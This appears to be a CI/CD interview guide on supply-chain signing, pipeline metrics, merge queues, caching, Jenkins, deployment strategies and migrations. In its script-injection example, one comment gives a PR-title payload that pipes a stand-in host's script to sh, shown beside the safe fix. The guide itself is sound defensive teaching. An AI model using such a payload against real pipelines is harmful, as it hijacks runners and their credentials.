**Provenance and signing.** The end state is being able to prove *which source, built by which pipeline, produced this artifact*. Generate an SBOM at build time and attach it to the image. Generate a provenance attestation recording the builder identity, the source commit, and the build parameters — SLSA is the framework that levels this. Sign artifacts with cosign, ideally in keyless mode, where the CI's OIDC token is exchanged for a short-lived certificate from Fulcio and the signature is logged in the Rekor transparency log, so there is no signing key to steal. Then *enforce* it at the point of use: an admission controller (Kyverno, Gatekeeper, or Sigstore's policy controller) that rejects any image lacking a valid signature from your expected identity. Signing without verification is decoration.
sections.code:
# ---------- SCRIPT INJECTION ----------
# VULNERABLE: the title is spliced into the shell program text.
- run: echo "Title: ${{ github.event.pull_request.title }}"
#   PR title:  a"; curl -s https://evil.sh | sh; #
#   -> arbitrary code on your runner, with the job's token and cloud role.

# SAFE: the value travels as DATA in the environment.
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"

# ---------- PIN ACTIONS BY SHA, NOT TAG ----------
# tags are mutable pointers in someone else's repo:
- uses: tj-actions/changed-files@v44                 # RISKY
# a commit SHA is content-addressed and cannot be re-pointed:
- uses: tj-actions/changed-files@1c938490c880156b746568a518594309cfb3f66b  # v44.5.7
# (Dependabot/Renovate update SHA pins for you - you keep updates, drop mutability.)

# ---------- LEAST PRIVILEGE ----------
permissions:
  contents: read            # default everything else to none
jobs:
  publish:
    permissions:
      contents: read
      packages: write       # only this job, only this scope
      id-token: write       # for keyless signing / OIDC

# ---------- KEYLESS SIGNING + SBOM + PROVENANCE ----------
- uses: sigstore/cosign-installer@v3
- name: Sign the image by digest (never by tag)
  env:
    COSIGN_EXPERIMENTAL: "1"
  run: |
    cosign sign --yes "ghcr.io/acme/api@${DIGEST}"
    syft "ghcr.io/acme/api@${DIGEST}" -o spdx-json > sbom.json
    cosign attest --yes --predicate sbom.json --type spdxjson \
      "ghcr.io/acme/api@${DIGEST}"
# Requires permissions: id-token: write. The signing key is ephemeral: the OIDC
# token is exchanged for a short-lived Fulcio cert, and the signature is recorded
# in the Rekor transparency log. There is no long-lived key to steal.

# ---------- VERIFY AT THE POINT OF USE (signing without this is decoration) ----
cosign verify "ghcr.io/acme/api@${DIGEST}" \
  --certificate-identity-regexp '^https://github\.com/acme/api/\.github/workflows/.+' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com

# Kubernetes admission policy (Kyverno): reject unsigned or foreign-built images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: { name: require-signed-images }
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-signature
      match: { any: [{ resources: { kinds: [Pod] } }] }
      verifyImages:
        - imageReferences: ["ghcr.io/acme/*"]
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/acme/*"
                    issuer: "https://token.actions.githubusercontent.com"

# ---------- runner hardening (self-hosted) ----------
#  - ephemeral: one job per runner, then destroy the VM/pod
#  - block egress to 169.254.169.254 (cloud metadata = the host's IAM role)
#  - never share a runner pool between public repos and production repos
#  - run unprivileged; no docker.sock mount (that is root on the host)

sections.title: 18. Operating the Pipeline: Metrics, Queue Time, Merge Queues, and Cost
sections.content:
A CI/CD platform is a production system with users, an SLO, and a cost. Senior interviews go here because it separates people who wrote a pipeline from people who ran one for a team of two hundred.

**Instrument the pipeline itself.** The four numbers that matter operationally: **queue time** (commit pushed to job started), **execution time** (job started to finished, p50 and p95 — the mean hides everything), **success rate on the default branch**, and **flake rate** (failures that pass on retry with no code change). Queue time is the one teams forget; a pipeline that executes in six minutes but waits nine for a runner has a fifteen-minute feedback loop, and no amount of test optimisation will fix it. Rising queue time means runner capacity, concurrency limits, or an autoscaler that scales too slowly for bursty demand — CI load is extremely bursty, spiking when everyone pushes before standup, and an autoscaler tuned for steady-state web traffic will always be behind.

Track these per-repository and per-job, and put a dashboard where the team sees it. Also track **time-to-red-fixed** on the default branch: how long trunk stays broken. A trunk that is red for hours means every other engineer is blocked or, worse, learns to ignore red.

**Main being broken is a team-scale outage.** Two mechanisms prevent it. Required status checks stop a PR merging while its own checks fail. But they do *not* prevent the semantic conflict: two PRs, each green against `main`, that break when both land — one renames a function, the other adds a caller. A **merge queue** (GitHub merge queue, GitLab merge trains, Zuul, Bors) solves this by building speculative merge commits in queue order and testing each against the actual state it will land on; a PR that fails is evicted and the queue re-forms. The queue can test several candidates in parallel optimistically, which keeps throughput up. Cost: extra CI runs. Benefit: `main` stays green without humans serialising merges by hand. Above roughly a dozen active contributors on one repository, this stops being optional.

**Cost.** CI is often a top-five infrastructure line item and it is usually invisible because it is billed as minutes rather than machines. The levers, in order of return. *Do not run work you do not need*: path filters so a docs change does not run the full integration suite; `concurrency` with `cancel-in-progress` so superseded PR runs die; `workflow: rules` to stop duplicate branch/MR pipelines. *Do not repeat work*: caching and build caches (Gradle/Bazel remote cache, `sccache`) so unchanged modules are not rebuilt. *Right-size the runner*: a 16-core runner for a single-threaded test suite burns cores for nothing, and conversely a 2-core runner on a parallelisable suite wastes wall-clock time that engineers pay for. *Pick the right ownership model*: hosted runners have no operational burden and a high per-minute price; self-hosted runners on spot/preemptible instances can be dramatically cheaper at scale but you now own autoscaling, image maintenance, and the security posture from the previous section. And *watch the fan-out*: a 40-cell matrix triggered on every push is 40 runners, and `max-parallel` plus tighter triggers is often a five-figure annual saving in a mid-size org.

**Treat pipeline definitions as code that deserves engineering.** They should be reviewed, versioned, tested where possible (`actionlint` for GitHub Actions, `gitlab-ci-lint` via the API, the Jenkins declarative linter), and factored — reusable workflows, shared libraries, `include:`/`extends:`. The failure mode is 60 repositories each with a 400-line hand-copied YAML file, where a security fix requires 60 pull requests and gets applied to 43 of them. Centralise the template, pin its version, and roll it out deliberately.

**Ownership and the human layer.** Someone must own the pipeline. Unowned CI degrades monotonically — checks get added, nothing gets removed, flakes accumulate, and the team routes around it with admin merges and `--no-verify`. The tell-tale signs an interviewer will recognise: a `#ci-failures` channel nobody reads, a documented "just re-run it" step, and a build that has been red on main since Tuesday. The counter-practices are cheap: an owner, a commit-stage duration SLO, a flake budget with quarantine and expiry, and the norm that a red trunk is the highest-priority thing on the team until it is green.
sections.code:
# ---------- instrument the pipeline: emit metrics from the pipeline itself ----
- name: report timings
  if: always()
  env:
    STATUS: ${{ job.status }}
    RUN_STARTED: ${{ github.event.repository.pushed_at }}
  run: |
    NOW=$(date +%s)
    curl -s -X POST "$METRICS_URL/ci" -H 'content-type: application/json' -d "$(jq -n \
      --arg repo "$GITHUB_REPOSITORY" --arg job "$GITHUB_JOB" \
      --arg status "$STATUS" --arg ref "$GITHUB_REF" --argjson ts "$NOW" \
      '{repo:$repo, job:$job, status:$status, ref:$ref, finished_at:$ts}')"

# Track, per repo and per job:
#   queue_time_seconds   p50/p95   <- commit pushed -> job started (usually ignored)
#   duration_seconds     p50/p95   <- means hide the tail; alert on p95
#   success_rate on the default branch
#   flake_rate = (failed then passed on retry, same SHA) / total
#   time_to_red_fixed on the default branch

# Pull historical run data straight from the API to find the real bottleneck:
gh api -X GET repos/acme/api/actions/runs --paginate -f per_page=100 \
  | jq -r '.workflow_runs[]
           | [.name, .conclusion, .created_at, .run_started_at, .updated_at]
           | @tsv'
# (run_started_at - created_at) = queue time. If that dominates, buy runners,
# do not refactor tests.

# ---------- merge queue: required status checks are NOT enough ----------
# PR #1 (green vs main): renames getUser() -> fetchUser()
# PR #2 (green vs main): adds a new call to getUser()
# Both merge -> main is broken, and neither PR was ever red.
on:
  merge_group:        # workflows must opt in to run on the speculative merge commit
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps: [{ uses: actions/checkout@v4 }, { run: npm ci && npm test }]

# ---------- lint the pipeline definitions in the pipeline ----------
actionlint                                     # GitHub Actions: catches bad
                                               # expressions, shellcheck issues,
                                               # unknown keys, injection patterns
curl -s --header "PRIVATE-TOKEN: $TOKEN" \
  --data-urlencode "content=$(cat .gitlab-ci.yml)" \
  "https://gitlab.example.com/api/v4/ci/lint"  # GitLab
java -jar jenkins-cli.jar -s "$JENKINS_URL" declarative-linter < Jenkinsfile

# ---------- cost levers, roughly by return ----------
#  1. do not run it:      path filters, workflow rules, concurrency cancellation
#  2. do not repeat it:   dependency + build caches, remote build cache
#  3. right-size:         match runner cores to actual parallelism of the workload
#  4. right ownership:    self-hosted on spot at scale; hosted for low volume
#  5. bound the fan-out:  max-parallel on big matrices; tighten triggers

interviewQA.q: What is the difference between continuous integration, continuous delivery, and continuous deployment?
interviewQA.a: They are three different claims. Continuous integration is about the merge: every developer integrates into trunk at least daily and each integration is verified by an automated build and test. The point is economic — merge cost grows superlinearly with divergence, so you pay a small constant cost instead of a large unpredictable one. This is why running Jenkins on fifteen long-lived feature branches is not CI; it is continuous building. Continuous delivery is about the artifact: every commit that passes the pipeline produces a release candidate that is provably deployable and sitting in a repository, with a rehearsed path to production, and the decision to release is a human business decision. The test is not 'can we deploy' but 'is the software always releasable and is deploying a non-event'. Continuous deployment removes the human gate: every green commit goes to production automatically. That is a strict superset requiring high-confidence tests, progressive rollout with automated metric gates, fast automatic rollback, and feature flags so that deployed and released are separate events. Most organisations run continuous delivery for some services and continuous deployment for others, and essentially nobody runs continuous deployment on a database schema or a mobile binary.
followUps: Which of these does your current team actually have, and what is the specific thing blocking the next one?
How would you measure whether CI is working, rather than just whether the CI server is running?
What has to be true about your test suite before continuous deployment is responsible rather than reckless?

interviewQA.q: Why is 'build once, promote everywhere' a rule, and what breaks when you violate it?
interviewQA.a: Because a build is not a pure function of your source. Rebuilding per environment re-resolves floating base image tags, hits package mirrors whose contents moved, picks up a patch release published an hour ago, and bakes in a different timestamp and locale. So the artifact you validated in staging is not the artifact you shipped, and every hour you then spend debugging is spent on the wrong binary. Building once also gives you the property that makes rollback fast: the previous artifact still exists. If deploying means 'rebuild from the previous tag', rollback costs a full build and may not even reproduce; if deploying means 'point at this digest', rollback is a control-plane update measured in seconds. The mechanical detail is tags versus digests — a tag is a mutable pointer in the registry's index and can be silently re-pointed, while a digest is the content hash of the manifest and can only ever name one artifact, so production manifests should reference digests. Promotion is then a metadata change: a Git commit in a config repo, an alias tag, or a database row that says which digest each environment runs. Everything environment-specific must be injected at deploy or run time, which means no baked-in API URLs and, less obviously, no build-time feature flags.
followUps: How do you actually verify that production is running the digest you think it is?
Where do you keep environment-specific configuration if the artifact must be identical?
What retention policy do you set on the registry, and how do you avoid deleting the image a live deployment still needs?

interviewQA.q: In GitHub Actions, what is the difference between a workflow, a job, and a step, and why does the distinction matter?
interviewQA.a: A workflow is a YAML file triggered by an event; it owns run-level concerns like concurrency and default permissions. A job is the unit of scheduling and isolation — every job gets its own fresh runner, jobs run in parallel by default, and 'needs' creates the dependency edges that make the job set a DAG. A step is a unit of work inside a job. The distinction matters because of what is shared. Steps share a runner: same filesystem, same working directory, so a file one step writes is there for the next. Jobs share nothing — no filesystem, no process state — so anything crossing a job boundary must use an explicit channel: outputs for small strings, artifacts for files, the cache for best-effort files, or an external system. That is why a build job and a test job that assume ./dist is present will fail. There is a second sharing subtlety inside a job: each 'run' step is a separate shell process, so 'export FOO=bar' does not survive to the next step. To persist an environment variable you append to the file at $GITHUB_ENV; to publish a value for later steps or downstream jobs you append to $GITHUB_OUTPUT. The old ::set-output command is deprecated and disabled.
followUps: How would you pass a 200 MB build output from one job to another, and what are the trade-offs versus rebuilding?
A downstream job with needs: [gate] runs even though the gate was skipped. Why, and how do you fix it?
When would you use a composite action instead of a reusable workflow?

interviewQA.q: Explain how CI caching works and how you design a cache key that is both fast and correct.
interviewQA.a: A cache is mutable global state your build silently reads, so the invariant is that a cache miss may cost time but never correctness — if a job produces a different result warm than cold, the cache is a bug, and I would verify that with a scheduled no-cache run. The key should be a hash of everything the content depends on: OS, architecture, toolchain version, and a hash of the lockfile — the lockfile specifically, not package.json or pom.xml, because the lockfile determines the resolved tree. OS and arch matter because native modules built on x86 Linux will not load on arm64 or macOS, and a cache crossing that boundary produces failures that look like corrupt binaries. Restore-keys are a prefix-match fallback: on an exact miss you restore the most recent entry with that prefix, which gets you most of the packages and only the deltas to download. But the restored tree does not match the current lockfile, so the install step must reconcile rather than trust — 'npm ci' deletes node_modules and installs exactly the lockfile and is safe, while 'npm install' over a stale tree is where phantom versions come from. Two more mechanics: in GitHub Actions cache entries are immutable, so a key with no hash in it is populated once and then serves a permanently stale snapshot forever; and caches are scoped by branch, restorable from the current ref, the PR base branch, and the default branch, which is what stops a pull request poisoning main's cache. I cache the package manager's download directory first because that content is immutable and content-addressed, then Docker layers, then compiler caches like sccache or a Gradle remote cache, and I treat caching node_modules itself as the risky option because it makes install a no-op so any key error becomes a correctness error.
followUps: What happens if the key never changes? What if it changes on every run?

How would you measure whether a given cache is actually paying for itself?

interviewQA.q: What is the difference between artifacts and cache in GitLab CI?
interviewQA.a: Artifacts are job outputs; cache is an input optimisation. Artifacts upload to the GitLab server when the job finishes, are guaranteed to be available to downstream jobs — by default all jobs in later stages, scoped more tightly with dependencies: or needs:artifacts — are downloadable in the UI, and expire per expire_in. Use them for build outputs, binaries, coverage, and test reports; artifacts:reports:junit gets parsed into the merge request widget, and artifacts:reports:dotenv injects variables into downstream jobs. Cache is stored per runner or in shared object storage, keyed by cache:key, and is explicitly best-effort — a job must still be correct when it is empty. Use it for node_modules, ~/.m2, .gradle, pip wheels, with policy: pull on consumers and pull-push on the single job that populates it so you are not paying upload cost everywhere. The rule of thumb is: if a downstream job breaks when the thing is missing, it is an artifact; if it merely gets slower, it is a cache. The classic bug is passing a compiled binary between jobs via cache — it works until the job lands on a different runner, and then you get a failure that reproduces nowhere.

interviewQA.q: Walk me through a Jenkins declarative pipeline and the controller/agent architecture.
interviewQA.a: The controller holds configuration, job definitions, build history, plugins, and the UI, and it schedules work; agents actually execute steps. Agents connect inbound — the agent dials the controller, historically JNLP and now typically WebSocket, which is what you want when the agent is behind NAT — or outbound over SSH. Each agent advertises executors, which are concurrent build slots, and labels, which is what 'agent { label "linux && docker" }' matches against. The first operational rule is to set the controller's executor count to zero, because a build running on the controller has arbitrary pipeline code in the same JVM and filesystem as the credentials store and $JENKINS_HOME, which is total compromise from one careless Jenkinsfile. A declarative pipeline is 'pipeline { agent ... stages { stage { steps { } } } post { } }'. I would use 'agent none' at the top with per-stage agents so each stage picks its environment and a manual input stage does not hold an executor for hours. The directives worth knowing are options (timeout, buildDiscarder, disableConcurrentBuilds, timestamps, skipDefaultCheckout), environment (including credentials binding), parameters, when with beforeAgent true so you do not provision an agent just to skip, parallel for fan-out, and post with always/success/failure/unstable/fixed/regression/cleanup. Declarative is preferable to scripted because Jenkins validates it before the build starts and can visualise it; you drop into script{} only for logic the schema cannot express, and if you are doing that constantly the logic belongs in a shared library or a shell script. Modern setups use ephemeral containerised agents — agent { docker { ... } } or agent { kubernetes { yaml ... } } — which cures the snowflake-agent problem where a build passes on one machine and fails on another.
followUps: Why should the controller have zero executors, concretely?
How do you pass a file from a stage on one agent to a stage on another, and what is the cost?
How do you avoid every service repo carrying a 300-line copy-pasted Jenkinsfile?

interviewQA.q: What is a Jenkins shared library and what goes wrong with them?
interviewQA.a: It is a Git repository with a fixed layout loaded into pipelines: vars/ holds global steps — a file vars/buildService.groovy defining call(Map cfg) becomes a step buildService(...) in any Jenkinsfile — src/ holds regular Groovy classes on the classpath, and resources/ holds non-Groovy files you load with libraryResource. You load it with @Library('acme-ci@v3') _ or configure it as an implicit global library. It is the mechanism that lets two hundred repos each carry a five-line Jenkinsfile. The main thing that goes wrong is versioning: @Library('acme-ci') resolving to a floating default branch means one merge instantly changes every pipeline in the company with no rollout, no canary, and no rollback. Pin to a tag or commit and roll new versions out deliberately. The second thing is CPS. Jenkins pipeline Groovy is transformed into continuation-passing style so a build can survive a controller restart, which serialises execution state at every step boundary. So every in-flight local variable must be Serializable — holding a regex Matcher or a parsed JSON node across an sh step throws NotSerializableException — and closure iteration like collection.each can misbehave, which is why you use an indexed for loop. CPS is also interpreted and disk-backed, and it runs on the controller, so heavy Groovy computation in a library hammers the whole instance. The fixes are @NonCPS on pure helper methods, which then may not call pipeline steps, and pushing real logic out of Groovy into scripts or a compiled tool in the repo. The Jenkinsfile should orchestrate, not compute.

interviewQA.q: Compare blue-green, canary, and rolling deployments. When would you pick each?
interviewQA.a: Rolling replaces instances in batches — in Kubernetes, maxSurge and maxUnavailable control the batch shape and the readiness probe gates each step. Both versions serve traffic simultaneously, so it requires forward and backward compatibility in APIs, message formats, and schema. Capacity cost is near zero and rollback is another rolling update in reverse, so it is not instant. It is the sensible default for stateless services with compatible versions. Blue-green runs two complete environments; green is deployed and fully tested with no real traffic, then a router flip moves everything at once. The point is rollback speed — flipping back is close to instant — and the ability to test the real deployed artifact on real infrastructure before any user sees it. The costs are double infrastructure during the transition, in-flight connection draining, and the fact that both colours usually share one database, so schema compatibility is still mandatory. Do the flip at the load balancer, not in DNS, because TTLs are advisory and resolvers and connection pools cache, so DNS 'instant rollback' can mean forty minutes of stragglers. Canary sends a small fraction of real traffic to the new version, evaluates health signals, and ramps. What makes it canary rather than a slow rollout is automated analysis: compare error rate, latency, and saturation for the canary population against the baseline population over the same window, and promote or abort automatically. Comparing canary-now against baseline-an-hour-ago attributes diurnal variation to your deploy. Canary is what you want for changes where you do not trust your tests to catch the failure mode — but it needs enough traffic to be statistically meaningful, and it only catches what your metrics can see. In practice these compose: progressive traffic weights over a blue-green-style pair, with feature flags inside the new version so individual behaviours can be disabled without touching the deployment.
followUps: Your service gets 20 requests a minute. Is canary analysis meaningful, and what do you do instead?
Both blue and green share a database. What constraints does that place on the change you are shipping?
What failure modes does a canary reliably miss?

interviewQA.q: A deploy has broken production. Walk me through what you do.
interviewQA.a: First, stop the bleeding rather than diagnose: roll back by default. A rollback returns to a state that demonstrably worked; a forward fix requires writing correct code under pressure while the incident continues. Concretely that is kubectl rollout undo, flipping a blue-green selector, or reverting the commit in the GitOps config repo — all control-plane operations that are fast precisely because the previous artifact still exists as an immutable digest. Then I check whether rollback is actually safe, and the question is always the database. If a migration has run, the previous application version has to be compatible with the current schema, which is only true if we followed expand-contract. If we shipped a step that stopped writing the old column, rolling back past it loses writes, and then the honest answer is forward-fix. Other cases where forward-fix wins: the change is irreversible in the outside world — messages consumed and acknowledged, emails sent, a partner notified — or the fix is a one-line config change that is genuinely faster and lower risk. What is never a rollback is restoring a database backup; that discards every write since the snapshot, which in a payments system is worse than the bug. After the bleeding stops: confirm recovery with the same SLIs that detected it, capture the artifact digest and logs from the bad version before anything reaps them, and only then diagnose. The follow-up work is usually pipeline work — what gate would have caught this, was it a canary that had no metric for this failure mode, and is the rollback path rehearsed on a schedule rather than tested for the first time during the incident.
followUps: When is rolling back the wrong call?
How do you make rollback fast as a property of the system rather than a script someone runs?
What is the last-known-good version, and how does your registry retention policy protect it?

interviewQA.q: How do you handle database migrations in a continuous delivery pipeline?
interviewQA.a: The controlling fact is that during any rolling deploy both application versions run simultaneously, so a schema change can never be atomic with a code change. Three rules follow: never couple them so tightly that they must be atomic, make every migration backward compatible with the previous application version, and never treat a backup restore as a rollback. The pattern that satisfies all three is expand-contract, also called parallel change. Renaming a column becomes five separately deployable steps. Expand: add the new nullable column and deploy code that writes both and reads the old one — both versions still work, fully reversible. Backfill in bounded batches. Switch: deploy code that reads the new column and still writes both — rolling back to the previous step is safe because both columns are populated. Stop: deploy code that reads and writes only the new column, and note this is the first irreversible boundary. Contract: drop the old column days later once the previous step is proven. The property that makes it work is that at every point, the running version and the version you would roll back to can both operate against the current schema. On mechanics: migrations run as a distinct, gated pipeline step, never from application startup, because startup migrations mean N pods racing the same DDL and a failed migration becomes a crash loop; use a tool that takes an advisory lock. Make the DDL non-blocking — CREATE INDEX CONCURRENTLY rather than CREATE INDEX, add columns nullable without a volatile default, and set a short lock_timeout so a statement that cannot get its lock fails fast instead of queueing, because an ALTER TABLE waiting behind a long transaction blocks every subsequent query on that table and turns a five-second migration into an outage. Backfill in batches with a pause between them rather than one giant UPDATE that holds a transaction open across millions of rows.
followUps: At which step does expand-contract stop being reversible, and what do you do if you need to roll back after it?
